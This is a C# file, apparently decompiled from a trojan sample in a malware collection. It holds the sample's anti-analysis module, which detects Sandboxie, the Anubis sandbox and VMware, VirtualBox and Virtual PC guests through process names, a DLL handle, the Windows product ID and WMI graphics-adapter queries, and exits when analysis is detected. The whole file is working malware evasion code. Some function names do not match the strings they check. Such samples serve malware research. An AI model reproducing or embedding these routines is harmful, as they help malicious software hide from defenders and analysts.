// Decompiled with JetBrains decompiler
// Type: WoRmy3.antis
// Assembly: WoRmy3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1B26AE86-BB0F-48C4-8B57-1FB3CCAD5BD2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.eggt-0a9369ef164691ad2732dc205399f3a03b3ae27182245bcbe5919174ce030c3c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WoRmy3
{
  [StandardModule]
  internal sealed class antis
  {
    private static object device;
    private static string graphicadapter;
    private static string regiona = "SELECT * FROM Win32_VideoController";
    private static RegistryKey regPID = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
    private static object pid = RuntimeHelpers.GetObjectValue(antis.regPID.GetValue("ProductID"));
    private static string id = "76487-337-8429955-22614";

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void Sleep(long dwMilliseconds);

    [DllImport("Kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long getmodulehandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpmodulename);

    public static bool antisandboxie()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        flag = Process.GetProcessesByName("SbieSvc").Length >= 1;
        goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool anubis()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        flag = Operators.ConditionalCompareObjectEqual(antis.pid, (object) antis.id, false);
        goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    private static void getdevices()
    {
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        object Instance = Interaction.GetObject("winmgmts:");
        object[] objArray = new object[1]
        {
          (object) antis.regiona
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(Instance, (System.Type) null, "execquery", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          antis.regiona = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        string str = Conversions.ToString(obj);
        int index = 0;
        int length = str.Length;
        while (index < length)
        {
          antis.graphicadapter = str[index].ToString();
          checked { ++index; }
        }
        goto label_11;
label_6:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_11;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static bool antivirtualbox()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        antis.getdevices();
        flag = Operators.CompareString(antis.graphicadapter, "VM Additions S3 Trio32/64", false) == 0;
        goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool antivmware()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        antis.getdevices();
        flag = Operators.CompareString(antis.graphicadapter, "VNware SVGA II", false) == 0;
        goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool antivirtualpc()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        antis.getdevices();
        flag = Operators.CompareString(antis.graphicadapter, "VirtualBox Graphics Adapter", false) == 0;
        goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static void compname()
    {
      string lpmodulename = "SBieDLL.dll";
      bool flag;
      if (antis.getmodulehandle(ref lpmodulename) != 0L)
        flag = true;
      if (!flag)
        return;
      ProjectData.EndApp();
    }

    public static bool antianubisbackup()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        flag = Operators.CompareString(Application.ExecutablePath, Application.StartupPath + "\\sample.exe", false) == 0;
        goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }
  }
}
